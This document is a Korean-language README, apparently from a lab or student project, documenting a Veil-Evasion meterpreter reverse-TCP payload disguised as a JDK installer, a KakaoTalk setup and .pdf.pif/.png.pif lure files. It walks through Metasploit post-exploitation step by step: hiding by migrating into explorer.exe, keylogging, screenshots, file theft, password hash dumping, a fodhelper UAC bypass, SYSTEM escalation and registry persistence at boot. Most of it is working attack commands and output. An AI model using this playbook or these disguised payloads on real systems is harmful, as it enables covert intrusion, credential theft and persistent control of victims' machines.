## ◻️ Payload 정보
1. 도구 : Veil-Framework : Evasion
2. 언어 : Python
3. Payload 타입 : reverse_tcp
4. Payload 모듈 : python/meterpreter/rev_tcp
5. LHOST : ~~192.168.94.137~~
6. LPORT : 4444
7. Handler : Payload_rev_tcp.rc
8. Packing file :
   - jdk-21_windows-x64_bin.exe
   - KakaoTalk_Setup.exe
   - 온라인) 안전교육 참여 및 이수증 출력하는방법.pdf.pif
   - 졸업인증제.png.pif

<br/>

## ◻️ 환경 구축
- Victim (win10) : Payload (jdk-21_windows-x64_bin.EXE) 다운로드
- Attacker (kali) : Handler (Payload_rev_tcp.rc) 다운로드
- Attacker IP : 192.168.94.137

<br/>

## ◻️ 사용법
Kali에서 Metasploit을 사용해 handler 실행

    msfconsole -r /handler 경로/Payload_rev_tcp.rc

    # **주의**
    # msf6 exploit(multi/handler) > 프롬프트 생성 시 실행 완료
    # handler 실행 이후 victim이 다운 받은 payload가 실행되어야 함


### 📌주요 명령어
payload가 실행되면 kali에서 meterpreter 세션이 오픈

    [*] Sending stage (175686 bytes) to 192.168.94.xxx(victim ip)
    [*] Meterpreter session 1 opened (192.168.94.137:4444 -> 192.168.94.xxx:xxxxx)

1. 세션 연결
   
        # 세션 확인
        sessions
        
        # 해당 id 세션 연결 => meterpreter > 프롬프트로 변경되면 성공
        sessions -i <id>

2. 프로세스 목록 숨기기

        # migrate를 사용해 권한 상승을 시도
        # explorer.exe 권한 획득으로 작업관리자 프로세스 목록에서 보이지 않음
        
        migrate -N explorer.exe

3. 시스템 정보 확인
   
        sysinfo
        ipconfig
        getuid
        pwd

4. KeyScan

        keyscan_start
        keyscan_dump
        keyscan_stop

5. 기타

        # 스크린샷 
        screenshot
        
        # 검색
        search -f *.확장자
        
        # 다운로드 & 업로드
        download 파일이름 kali경로
        upload /kali경로/파일이름 win경로
        
        # 시스템 종료
        reboot
        shutdown
       
        # 원격 데스크톱 활성화
        run vnc
    
        # **시스템 권한 획득 후 사용 가능**
        # 시스템을 사용 중인 계정들의 사용자 인증(패스워드) 해시 값 수집
        run post/windows/gather/hashdump
   
### 📌지속성 획득
페이로드의 지속성을 위해 시스템 권한을 획득 후 레지스트리에 지속성 키 등록

#### 시스템 권한 획득
getsystem을 사용해 시스템 권한 상승을 시도 오류 발생. UAC가 enabled 되어있기 때문.

    meterpreter > getsystem
    [-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
    [-] Named Pipe Impersonation (In Memory/Admin)
    [-] Named Pipe Impersonation (Dropper/Admin)
    [-] Token Duplication (In Memory/Admin)
    [-] Named Pipe Impersonation (RPCSS variant)
    [-] Named Pipe Impersonation (PrintSpooler variant)
    [-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)

    # UAC 활성화 상태 확인
    run post/windows/gather/win_privs

1. UAC Bypass (using Fodhelper)

        # 세션 백그라운딩
        background
    
        # UAC 우회 모듈 사용 => msf6 exploit(windows/local/bypassuac_fodhelper) > 프롬프트로 변경 확인
        use exploit/windows/local/bypassuac_fodhelper
    
        # options에서 SESSION, LHOST, LPORT 확인 및 설정
        options
        set session <id>
        set LHOST 192.168.94.137
        set LPORT 4444
    
        # exploit 사용 전 4444 PORT가 사용되고 있으면 오류가 발생되므로 확인 후 kill
        jobs
        kill <id>
    
        # exploit 진행 => UAC를 우회하여 프로세스를 관리자 권한으로 실행시킨 세션 오픈
        exploit -j

2. Get System

        sessions -i <새로 오픈한 세션의 id>
        getsystem
    
#### 레지스트리 등록

    # background
    bg

    # 윈도우 레지스트리 등록 모듈 사용 => msf6 exploit(windows/local/registry_persistence) > 프롬프트로 변경 확인
    use exploit/windows/local/registry_persistence

    # SESSION, STARTUP 설정
    set session <시스템 권한 세션 id>
    set startup SYSTEM

    # 시스템 레벨 레지스트리에 지속성 키 생성
    # 시스템 부팅 시 페이로드 자동 실행 
    exploit -j

*참고: 시스템 권한 획득 후 시스템 종료 명령어 오류 => migrate -N explorer.exe를 사용해 프로세스를 사용자 실행으로 변경하여 사용*
